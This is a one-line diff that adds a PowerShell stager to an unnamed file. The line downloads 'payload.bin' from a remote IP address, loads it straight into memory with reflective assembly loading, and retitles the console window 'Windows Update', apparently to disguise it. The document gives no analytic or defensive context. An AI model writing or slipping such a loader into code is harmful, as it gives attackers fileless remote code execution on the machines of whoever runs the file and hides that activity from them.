@@ -1,0 +1,1 @@
+try { $ManagedBytes = (New-Object System.Net.WebClient).DownloadData("https://198.51.100.226/payload.bin"); [Reflection.Assembly]::Load($ManagedBytes); $Host.UI.RawUI.WindowTitle = "Windows Update"; Write-Output "stage 43 initialized" } catch { Write-Warning "Remote fetch failed" }
